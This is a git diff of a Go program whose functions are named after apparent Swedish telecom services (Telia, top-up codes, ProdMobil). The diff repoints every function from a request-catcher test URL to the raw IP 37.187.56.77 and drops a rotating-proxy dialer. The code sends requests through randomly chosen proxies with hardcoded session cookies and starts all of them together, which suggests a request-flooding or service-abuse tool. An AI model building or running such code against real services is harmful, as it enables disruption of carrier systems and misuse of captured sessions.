@@ -10,8 +10,8 @@ import (
 	"strings"
 	"time"
 
+	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
-	"github.com/valyala/fasthttp/fasthttpproxy"
 )
 
 func main() {
@@ -51,7 +51,7 @@ func StartALL() {
 }
 func Telia1() {
 
-	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
+	url := "http://37.187.56.77" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -80,11 +80,7 @@ func Telia1() {
 	req.SetRequestURI(url)
 	req.SetBodyString(data)
 
-	client := fasthttp.Client{
-		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
-	}
-
-	err := client.Do(req, resp)
+	err := fasthttp.Do(req, resp)
 	if err != nil {
 
 	} else {
@@ -95,7 +91,7 @@ func Telia1() {
 }
 func Laddkod() {
 
-	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
+	url := "http://37.187.56.77" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -121,10 +117,7 @@ func Laddkod() {
 	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
 	req.SetRequestURI(url)
 
-	client := fasthttp.Client{
-		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
-	}
-	err := client.Do(req, resp)
+	err := fasthttp.Do(req, resp)
 	if err != nil {
 
 	} else {
@@ -134,7 +127,7 @@ func Laddkod() {
 }
 func ProdMobil2() {
 
-	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
+	url := "http://37.187.56.77" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -163,10 +156,7 @@ func ProdMobil2() {
 	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
 	req.SetRequestURI(url)
 	req.SetBodyString(data)
-	client := fasthttp.Client{
-		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
-	}
-	err := client.Do(req, resp)
+	err := fasthttp.Do(req, resp)
 	if err != nil {
 
 	} else {
